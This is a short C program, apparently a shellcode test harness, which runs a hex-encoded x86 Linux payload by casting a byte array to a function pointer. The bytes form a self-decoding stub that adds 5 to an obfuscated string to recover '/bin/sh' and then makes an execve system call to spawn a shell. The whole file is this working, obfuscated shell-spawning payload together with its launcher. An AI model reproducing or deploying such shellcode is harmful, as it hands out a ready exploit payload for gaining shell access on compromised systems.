#include <stdio.h>
#include <string.h>

unsigned char code[] = "\xeb\x30\x5e\x31\xc0\x31\xdb\x31\xc9\xb0\x10\x8a\x1c\x0e\x80\xc3\x05\x88\x1c\x0e\x41\x38\xc8\x75\xf2\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xcb\xff\xff\xff\x2a\x5d\x64\x69\x2a\x6e\x63\x45\x3c\x3c\x3c\x3c\x46\x46\x46\x46";

int
main() {

printf("Shellcode Length:  %d\n", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();

return 0;
}
